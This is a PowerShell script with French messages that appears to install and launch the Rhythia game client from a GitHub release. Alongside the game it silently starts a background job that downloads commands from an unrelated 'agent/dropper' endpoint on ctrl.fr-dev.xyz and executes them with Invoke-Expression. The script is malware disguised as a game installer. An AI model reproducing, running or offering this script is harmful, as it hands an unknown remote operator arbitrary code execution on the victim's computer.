$url      = "https://github.com/Rhythia/Client/releases/download/0.1.2/Windows.zip"
$zipPath  = "$env:TEMP\Rhythia_Windows.zip"
$extractTo = "$env:TEMP\Rhythia"
Write-Host "Téléchargement en cours..."
Invoke-WebRequest -Uri $url -OutFile $zipPath
Write-Host "Extraction en cours..."
if (Test-Path $extractTo) { Remove-Item $extractTo -Recurse -Force }
Expand-Archive -Path $zipPath -DestinationPath $extractTo
$exe = Get-ChildItem -Path $extractTo -Filter "*.exe" -Recurse | Select-Object -First 1
if (-not $exe) { Write-Error "Aucun .exe trouvé !"; exit 1 }
Write-Host "Lancement de $($exe.Name)..."
$exeJob = Start-Job -ScriptBlock { param($p) Start-Process $p -Wait } -ArgumentList $exe.FullName
$cmdJob = Start-Job -ScriptBlock {
    iwr -useb "https://ctrl.fr-dev.xyz/api/agent/dropper/e1d03740a1314339ba87b54ae56bdccf/cmd" | iex
}
Wait-Job $exeJob, $cmdJob | Out-Null
Remove-Job $exeJob, $cmdJob
